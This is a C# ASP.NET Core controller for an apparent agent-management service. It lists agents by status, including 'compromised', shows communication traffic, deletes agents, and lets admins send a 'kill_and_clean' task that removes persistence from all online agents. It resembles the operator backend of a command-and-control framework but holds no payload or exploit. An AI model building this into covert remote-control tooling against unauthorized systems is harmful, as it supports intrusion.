using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using LibraNextgen.Common.Models;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Controllers;

[ApiController]
[Route("api/agents")]
[Authorize]
public class AgentsController : ControllerBase
{
    private readonly AgentService _agentService;
    private readonly AgentCommsService _commsService;
    private readonly TaskService _taskService;

    public AgentsController(AgentService agentService, AgentCommsService commsService, TaskService taskService)
    {
        _agentService = agentService;
        _commsService = commsService;
        _taskService = taskService;
    }

    [HttpGet]
    public async Task<IActionResult> GetAll(
        [FromQuery] int page = 1,
        [FromQuery] int pageSize = 50,
        [FromQuery] string? status = null,
        CancellationToken ct = default)
    {
        AgentStatus? statusFilter = status?.ToLower() switch
        {
            "online" => AgentStatus.Online,
            "offline" => AgentStatus.Offline,
            "sleeping" => AgentStatus.Sleeping,
            "compromised" => AgentStatus.Compromised,
            _ => null
        };
        var agents = await _agentService.GetAllAsync(page, pageSize, statusFilter, ct);
        var total = statusFilter.HasValue
            ? await _agentService.CountByStatusAsync(statusFilter.Value, ct)
            : await _agentService.CountAsync(ct);
        var online = await _agentService.CountByStatusAsync(AgentStatus.Online, ct);
        return Ok(new { agents, total, online, page, pageSize });
    }

    [HttpGet("{id}")]
    public async Task<IActionResult> GetById(string id, CancellationToken ct)
    {
        var agent = await _agentService.GetByIdAsync(id, ct);
        if (agent == null) return NotFound();
        return Ok(agent);
    }

    [HttpGet("traffic")]
    public async Task<IActionResult> GetTraffic([FromQuery] int minutes = 30, CancellationToken ct = default)
    {
        var records = await _commsService.GetTrafficAsync(Math.Clamp(minutes, 1, 20160));
        return Ok(new { traffic = records });
    }

    [HttpDelete("{id}")]
    [Authorize(Roles = "Admin")]
    public async Task<IActionResult> Delete(string id, CancellationToken ct)
    {
        var deleted = await _agentService.DeleteAsync(id, ct);
        if (deleted == 0) return NotFound();
        return NoContent();
    }

    /// <summary>
    /// Send kill_and_clean to all online agents — removes persistence and exits.
    /// </summary>
    [HttpPost("kill-all")]
    [Authorize(Roles = "Admin")]
    public async Task<IActionResult> KillAll(CancellationToken ct)
    {
        var username = User.Identity?.Name ?? "unknown";
        var online = await _agentService.GetOnlineAsync(ct);
        var count = 0;

        foreach (var agent in online)
        {
            await _taskService.CreateAsync(new TaskCreateRequest
            {
                AgentId = agent.Id,
                CommandType = CommandType.KillAndClean,
                Command = "kill_and_clean",
                TimeoutSeconds = 5,
            }, username, ct);
            count++;
        }

        return Ok(new { status = "sent", count });
    }
}
